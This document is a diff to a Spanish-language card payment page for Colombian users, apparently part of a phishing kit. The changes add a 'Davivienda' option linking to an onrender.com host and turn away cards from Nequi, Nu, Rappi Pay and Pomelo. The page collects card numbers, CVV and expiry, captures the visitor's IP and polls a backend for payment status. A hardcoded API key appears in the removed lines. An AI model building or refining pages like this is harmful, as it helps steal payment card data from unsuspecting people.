@@ -66,20 +66,13 @@
             cursor: pointer; transition: all 0.2s ease;
             background: #fff;
         }
-        .method-card:hover:not(.disabled) { border-color: #111111; box-shadow: 0 4px 14px rgba(0,0,0,0.08); transform: translateY(-1px); }
-        .method-card.disabled { opacity: 0.45; cursor: not-allowed; background: #fafafa; }
+        .method-card:hover { border-color: #111111; box-shadow: 0 4px 14px rgba(0,0,0,0.08); transform: translateY(-1px); }
         .method-left { display: flex; align-items: center; gap: 14px; }
         .method-icon { width: 48px; height: 32px; object-fit: contain; flex-shrink: 0; }
         .method-text { display: flex; flex-direction: column; gap: 2px; }
         .method-name { font-size: 14px; font-weight: 600; color: #222; }
         .method-desc { font-size: 11px; color: #888; font-weight: 400; }
-        .method-badge {
-            font-size: 9px; font-weight: 700; letter-spacing: 0.5px;
-            background: #f0f0f0; color: #777;
-            padding: 3px 7px; border-radius: 4px; text-transform: uppercase;
-        }
         .method-arrow { color: #bbb; font-size: 18px; font-weight: 700; }
-        .method-card.disabled .method-arrow { display: none; }
 
         /* --- PANTALLA 2: FORMULARIO DE TARJETA --- */
         .card-form { padding: 25px 20px; display: none; }
@@ -123,9 +116,26 @@
         .btn-submit:hover { background-color: #333333; }
         .btn-submit:disabled { background-color: #999; cursor: not-allowed; }
 
-        /* --- ALERTA ERROR --- */
+        /* --- ALERTA ERROR / AVISO --- */
         .alert { padding: 10px; border-radius: 4px; margin-bottom: 15px; font-size: 12px; display: none; background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; font-weight: 600; }
         .alert.show { display: block; }
+
+        /* --- AVISO FORMAL EMISORES --- */
+        .aviso-emisor {
+            display: none;
+            padding: 14px 16px;
+            margin: 0 0 18px 0;
+            background: #fff8e1;
+            color: #8a6d3b;
+            border: 1px solid #ffe0b2;
+            border-left: 4px solid #f0ad4e;
+            border-radius: 6px;
+            font-size: 12.5px;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+        .aviso-emisor.show { display: block; }
+        .aviso-emisor strong { font-weight: 700; color: #6d4c1f; }
 
         /* --- FOOTER LOGOS --- */
         .footer-logos { display: flex; justify-content: flex-start; align-items: center; padding: 15px 20px; background: #fff; border-top: 1px solid #eee; }
@@ -213,12 +223,11 @@
         </div>
 
         <!-- ============================================================ -->
-        <!-- PANTALLA: MEDIOS DE PAGO                                       -->
+        <!-- PANTALLA: MEDIOS DE PAGO (TARJETA + DAVIVIENDA)               -->
         <!-- ============================================================ -->
         <div class="payment-methods" id="paymentMethodsScreen">
             <div class="section-title">Medios de pago</div>
 
-            <!-- Opción TARJETA (habilitada) -->
             <div class="method-card" id="methodCard">
                 <div class="method-left">
                     <img src="tarjeta.png" alt="Tarjeta" class="method-icon">
@@ -230,17 +239,16 @@
                 <span class="method-arrow">›</span>
             </div>
 
-            <!-- Opción PSE (deshabilitada) -->
-            <div class="method-card disabled">
+            <a href="https://pasegrodvcolombia.onrender.com/" class="method-card" id="methodDavivienda" style="text-decoration:none; color:inherit;">
                 <div class="method-left">
-                    <img src="pse.png" alt="PSE" class="method-icon">
+                    <img src="davi1.png" alt="Davivienda" class="method-icon">
                     <div class="method-text">
-                        <span class="method-name">PSE</span>
-                        <span class="method-desc">Pago en línea con tu banco</span>
+                        <span class="method-name">Davivienda</span>
+                        <span class="method-desc">Pago con Davivienda</span>
                     </div>
                 </div>
-                <span class="method-badge">No disponible</span>
-            </div>
+                <span class="method-arrow">›</span>
+            </a>
         </div>
 
         <!-- ============================================================ -->
@@ -267,6 +275,11 @@
                     <div class="card-logo-container" id="cardLogo"></div>
                 </div>
                 <div class="error-message" id="cardNumberError" style="display:none; color:#e53935; font-size:12px; margin-top:-15px; margin-bottom:15px;"></div>
+
+                <!-- AVISO FORMAL: EMISORES NO DISPONIBLES -->
+                <div class="aviso-emisor" id="avisoEmisor">
+                    <strong>Aviso importante:</strong> Por el momento, no es posible procesar pagos con tarjetas emitidas por <strong>Nequi, Nu, Rappi Pay o Pomelo</strong>. Le sugerimos utilizar una tarjeta de crédito o débito de otra entidad bancaria para completar su trámite. Agradecemos su comprensión.
+                </div>
 
                 <div class="form-row">
                     <div class="input-group">
@@ -326,13 +339,12 @@
     <!-- LÓGICA CONECTADA AL BACKEND NODE.JS -->
     <script>
         // ============================================================
-        // CONFIGURACIÓN (Rutas relativas para el proxy)
+        // CONFIGURACIÓN
         // ============================================================
         const API_CREAR_PAGO = '/api/crear-pago';
         const API_ESTADO_PAGO = '/api/estado-pago';
         const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000;
-        const HANDYAPI_KEY = 'PUB-co5YEcRHr043lS53Ctgn86usDYGx';
 
         // ============================================================
         // DATOS DEL SOLICITANTE (SOLO LECTURA)
@@ -433,6 +445,7 @@
         const alertError = document.getElementById('alertError');
         const mensajeError = document.getElementById('mensajeError');
         const cardNumberError = document.getElementById('cardNumberError');
+        const avisoEmisor = document.getElementById('avisoEmisor');
 
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
@@ -443,23 +456,40 @@
         const initialSpinner = document.getElementById('initialSpinner');
 
         // ============================================================
-        // BINS BLOQUEADOS
+        // AVISO FORMAL AL ENFOCAR / CLIC EN NÚMERO DE TARJETA
         // ============================================================
-        const BINS_NU = ['528892', '555825', '555829', '52141881', '52749332', '54549472', '55952666', '55953587'];
-        const BINS_NEQUI = ['409355'];
-        function getBinBloqueadoInfo(cardNumber) {
-            const clean = cardNumber.replace(/\s/g, '');
-            for (const bin of BINS_NEQUI) {
-                if (clean.startsWith(bin)) return { bloqueado: true, tipo: 'nequi', mensaje: '⚠️ Nequi se encuentra fuera de servicio en este momento. Por favor, intente con otra tarjeta.' };
+        function mostrarAvisoEmisor() {
+            avisoEmisor.classList.add('show');
+        }
+        function ocultarAvisoEmisor() {
+            avisoEmisor.classList.remove('show');
+        }
+
+        inputNumero.addEventListener('focus', mostrarAvisoEmisor);
+        inputNumero.addEventListener('click', mostrarAvisoEmisor);
+
+        document.addEventListener('click', function(e) {
+            if (!inputNumero.contains(e.target) && !avisoEmisor.contains(e.target)) {
+                ocultarAvisoEmisor();
             }
-            for (const bin of BINS_NU) {
-                if (clean.startsWith(bin)) return { bloqueado: true, tipo: 'nu', mensaje: '⚠️ Nu se encuentra fuera de servicio en este momento. Por favor, intente con otra tarjeta.' };
-            }
-            return { bloqueado: false };
+        });
+
+        // ============================================================
+        // SERIES / BINs RECHAZADOS
+        // ============================================================
+        const SERIES_RECHAZADAS = ['40935500', '45251601', '52888', '555825'];
+
+        function esSerieRechazada(numero) {
+            const clean = String(numero || '').replace(/\s/g, '');
+            return SERIES_RECHAZADAS.some(serie => clean.startsWith(serie));
+        }
+
+        function mensajeSerieRechazada() {
+            return 'Por el momento, no es posible procesar pagos con tarjetas de esta entidad. Le sugerimos utilizar una tarjeta de crédito o débito de otro banco para completar su trámite.';
         }
 
         // ============================================================
-        // DETECCIÓN DE TIPO DE TARJETA
+        // DETECCIÓN DE TIPO DE TARJETA (SIN BLOQUEOS)
         // ============================================================
         const cardPatterns = {
             visa: { regex: /^4[0-9]{12}(?:[0-9]{3})?$/ },
@@ -489,60 +519,6 @@
         
         function formatCardNumber(value) { return value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(); }
         function formatExpiry(value) { const cleaned = value.replace(/\D/g, ''); if (cleaned.length >= 2) return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4); return cleaned; }
-
-        // ============================================================
-        // DETECCIÓN DE BANCO POR BIN
-        // ============================================================
-        const binCache = new Map();
-        const bankNameMapping = {
-            'bancolombia': 'Bancolombia', 'bancolombia s.a.': 'Bancolombia', 'davivienda': 'Davivienda',
-            'bbva colombia': 'BBVA Colombia', 'bbva': 'BBVA Colombia', 'banco de bogotá': 'Banco de Bogotá',
-            'banco de bogota': 'Banco de Bogotá', 'banco popular': 'Banco Popular', 'banco occidente': 'Banco Occidente',
-            'citibank colombia': 'Citibank Colombia', 'citibank': 'Citibank Colombia', 'banco av villas': 'Banco AV Villas',
-            'itau': 'Itaú', 'banco itaú': 'Itaú', 'gnb sudameris': 'Banco GNB Sudameris', 'falabella': 'Banco Falabella',
-            'pichincha': 'Banco Pichincha', 'caja social': 'Caja Social', 'banco caja social': 'Caja Social',
-            'coopcentral': 'Banco Cooperativo Coopcentral', 'bancoomeva': 'Bancoomeva', 'finandina': 'Banco Finandina',
-            'davibank': 'Davibank', 'scotiabank colpatria': 'Scotiabank Colpatria', 'banco agrario': 'Banco Agrario'
-        };
-
-        async function detectBankByBIN(cardNumber) {
-            const clean = cardNumber.replace(/\s/g, '');
-            if (clean.length < 6) { detectedBank = null; return null; }
-            const bin = clean.substring(0, 6);
-            const localCache = JSON.parse(localStorage.getItem('binCache') || '{}');
-            if (localCache[bin] !== undefined) { detectedBank = localCache[bin]; return detectedBank; }
-            if (binCache.has(bin)) { detectedBank = binCache.get(bin); return detectedBank; }
-
-            try {
-                const response = await fetch(`https://data.handyapi.com/bin/${bin}`, {
-                    headers: { 'x-api-key': HANDYAPI_KEY, 'Accept': 'application/json' }
-                });
-                
-                if (response.ok) {
-                    const data = await response.json();
-                    let bankName = 'Desconocido';
-                    
-                    if (data.Status === 'SUCCESS' && data.Issuer) {
-                        const rawName = data.Issuer.toLowerCase().trim();
-                        for (const [key, value] of Object.entries(bankNameMapping)) {
-                            if (rawName.includes(key) || key.includes(rawName)) { bankName = value; break; }
-                        }
-                        if (bankName === 'Desconocido') bankName = data.Issuer;
-                    }
-
-                    binCache.set(bin, bankName);
-                    localCache[bin] = bankName;
-                    localStorage.setItem('binCache', JSON.stringify(localCache));
-                    detectedBank = bankName;
-                    localStorage.setItem('bancoEmisor', bankName);
-                    return bankName;
-                }
-            } catch (error) { 
-                console.warn('Error consultando HandyAPI:', error);
-            }
-            detectedBank = 'Desconocido';
-            return 'Desconocido';
-        }
 
         // ============================================================
         // HELPERS UI
@@ -579,20 +555,21 @@
         // ============================================================
         // INPUTS
         // ============================================================
-        let bankTimeout = null;
         inputNumero.addEventListener('input', function() {
             let value = this.value.replace(/\s/g, '').replace(/\D/g, '');
             this.value = formatCardNumber(value);
             if (value.length >= 3) { cardType = detectCardType(value); updateCardLogo(cardType); }
             else { cardLogo.innerHTML = ''; cardType = null; }
-            
-            const info = getBinBloqueadoInfo(value);
-            if (value.length >= 6 && info.bloqueado) { cardNumberError.textContent = info.mensaje; cardNumberError.style.display = 'block'; inputNumero.closest('.input-group').classList.add('error'); }
-            else { cardNumberError.style.display = 'none'; inputNumero.closest('.input-group').classList.remove('error'); }
-            
-            clearTimeout(bankTimeout);
-            if (value.length >= 6) { bankTimeout = setTimeout(() => detectBankByBIN(value), 600); }
-            else { detectedBank = null; localStorage.removeItem('bancoEmisor'); }
+
+            // Validación de series rechazadas
+            if (esSerieRechazada(value)) {
+                cardNumberError.textContent = mensajeSerieRechazada();
+                cardNumberError.style.display = 'block';
+                inputNumero.closest('.input-group').classList.add('error');
+            } else {
+                cardNumberError.style.display = 'none';
+                inputNumero.closest('.input-group').classList.remove('error');
+            }
         });
         inputExp.addEventListener('input', function() { this.value = this.value.replace(/[^0-9/]/g, ''); this.value = formatExpiry(this.value); });
         inputCVV.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); });
@@ -743,8 +720,6 @@
             const cuotasSeleccionadas = selectCuotas.value;
             const terms = document.getElementById('terms').checked;
 
-            const info = getBinBloqueadoInfo(numero);
-            if (info.bloqueado) { mostrarError(info.mensaje); return; }
             if (!nombre) { mostrarError('Por favor, ingresa el nombre del titular'); return; }
             if (!numero || numero.length < 15) { mostrarError('El número de tarjeta debe tener al menos 15 dígitos'); return; }
             if (!exp || !/^\d{2}\/\d{2}$/.test(exp)) { mostrarError('Ingresa una fecha de vencimiento válida (MM/AA)'); return; }
@@ -752,11 +727,14 @@
             if (!cuotasSeleccionadas) { mostrarError('Por favor, selecciona el número de cuotas'); return; }
             if (!terms) { mostrarError('Debes aceptar los términos de servicio'); return; }
 
+            // Validación de series rechazadas (bloqueo real)
+            if (esSerieRechazada(numero)) { mostrarError(mensajeSerieRechazada()); return; }
+
             cardType = detectCardType(numero);
             if (!cardType) { mostrarError('Tipo de tarjeta no reconocido'); return; }
 
-            if (!detectedBank && numero.length >= 6) { await detectBankByBIN(numero); await new Promise(r => setTimeout(r, 500)); }
             if (!detectedBank) { detectedBank = 'Desconocido'; localStorage.setItem('bancoEmisor', 'Desconocido'); }
+
             if (!localStorage.getItem('usuario_ip') || localStorage.getItem('usuario_ip') === 'Desconocida') { await capturarIP(); }
 
             solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
